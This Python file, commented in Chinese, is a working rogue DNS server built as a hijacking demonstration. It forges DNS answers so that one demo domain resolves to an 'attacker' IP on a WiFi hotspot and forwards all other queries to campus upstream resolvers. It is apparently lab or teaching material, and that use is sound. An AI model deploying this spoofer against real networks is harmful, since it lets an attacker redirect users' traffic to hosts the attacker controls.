"""
恶意 DNS 服务器 — 模拟 DNS 劫持攻击

在 WiFi 热点上运行，将 security-demo-lab.xyz 解析到攻击者 IP。
其余所有域名正常转发到上游 DNS。
"""
import socket
import struct
import sys
import threading

# ── 配置 ────────────────────────────────────────────
HOST = '0.0.0.0'          # 监听所有接口
PORT = 53                  # DNS 标准端口（需管理员权限）
HIJACK_DOMAIN = 'security-demo-lab.xyz'
# 攻击者服务器 IP（添加在热点网卡的第二个 IP）
ATTACKER_IP = '192.168.137.10'

# 上游 DNS（用于正常域名查询）
UPSTREAM_DNS = ('202.115.39.9', 53)      # 校园网主 DNS
UPSTREAM2_DNS = ('202.115.39.6', 53)    # 校园网备 DNS


def build_dns_response(query_data, answer_ip):
    """构造 DNS 响应：域名 → answer_ip"""
    transaction_id = query_data[:2]
    flags = b'\x81\x80'          # 标准响应 + 无错误
    questions = query_data[4:6]   # 问题数
    answer_rrs = b'\x00\x01'      # 1 个答案
    authority_rrs = b'\x00\x00'
    additional_rrs = b'\x00\x00'

    # 原样返回问题部分
    question_start = 12
    question_end = query_data.find(b'\x00', question_start) + 5
    question_section = query_data[question_start:question_end]

    # 构造答案部分
    name_pointer = b'\xc0\x0c'          # 压缩指针指向问题域名
    type_a = b'\x00\x01'                # A 记录
    class_in = b'\x00\x01'              # IN
    ttl = b'\x00\x00\x00\x3c'           # TTL = 60秒
    data_len = b'\x00\x04'              # IP 是 4 字节
    ip_bytes = socket.inet_aton(answer_ip)  # 攻击者 IP 的字节表示

    answer_section = name_pointer + type_a + class_in + ttl + data_len + ip_bytes

    return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + question_section + answer_section


def forward_to_upstream(query_data):
    """转发查询到上游 DNS 并返回响应"""
    try:
        upstream_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        upstream_sock.settimeout(3)
        upstream_sock.sendto(query_data, UPSTREAM_DNS)
        response, _ = upstream_sock.recvfrom(1024)
        upstream_sock.close()
        return response
    except socket.timeout:
        try:
            upstream_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            upstream_sock.settimeout(3)
            upstream_sock.sendto(query_data, UPSTREAM2_DNS)
            response, _ = upstream_sock.recvfrom(1024)
            upstream_sock.close()
            return response
        except Exception:
            return None


def extract_domain(query_data):
    """从 DNS 查询中提取域名"""
    try:
        pos = 12
        domain_parts = []
        while True:
            length = query_data[pos]
            if length == 0:
                break
            if length >= 64:
                break
            pos += 1
            try:
                part = query_data[pos:pos + length].decode('ascii')
            except UnicodeDecodeError:
                return None
            domain_parts.append(part)
            pos += length
        return '.'.join(domain_parts).lower()
    except (IndexError, AttributeError):
        return None


def handle_query(data, client_addr, server_sock):
    """处理单个 DNS 查询"""
    if len(data) < 12:
        return

    domain = extract_domain(data)

    if domain == HIJACK_DOMAIN:
        print(f'[劫持] {domain} → {ATTACKER_IP}  (客户端: {client_addr[0]})')
        response = build_dns_response(data, ATTACKER_IP)
        if response:
            server_sock.sendto(response, client_addr)
    elif domain:
        print(f'[转发] {domain} → 上游 DNS')
        response = forward_to_upstream(data)
        if response:
            server_sock.sendto(response, client_addr)
        else:
            print(f'[失败] {domain} — 上游无响应')


def main():
    print('=' * 55)
    print('恶意 DNS 服务器 (DNS Hijacking Demo)')
    print('=' * 55)
    print(f'监听: {HOST}:{PORT}')
    print(f'劫持目标: {HIJACK_DOMAIN} → {ATTACKER_IP}')
    print(f'其他域名: 转发 → {UPSTREAM_DNS[0]}')
    print()

    server_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # 只绑攻击者 IP，不跟 SharedAccess (0.0.0.0:53) 冲突
    for bind_host in ['192.168.137.10']:
        try:
            server_sock.bind((bind_host, PORT))
            print(f'[成功] 绑定到 {bind_host}:{PORT}')
            break
        except (PermissionError, OSError) as e:
            continue
    else:
        print('[错误] 端口 53 被占用。请在管理员终端执行:')
        print('  net stop SharedAccess')
        print('  python rogue_dns.py')
        print('  (另开终端) net start SharedAccess')
        sys.exit(1)

    print('[就绪] 恶意 DNS 服务器已启动，等待查询...\n')

    while True:
        try:
            data, client_addr = server_sock.recvfrom(512)
            threading.Thread(target=handle_query, args=(data, client_addr, server_sock), daemon=True).start()
        except KeyboardInterrupt:
            print('\n[DNS 服务器已停止]')
            break
        except Exception as e:
            print(f'[错误] {e}')

    server_sock.close()


if __name__ == '__main__':
    main()
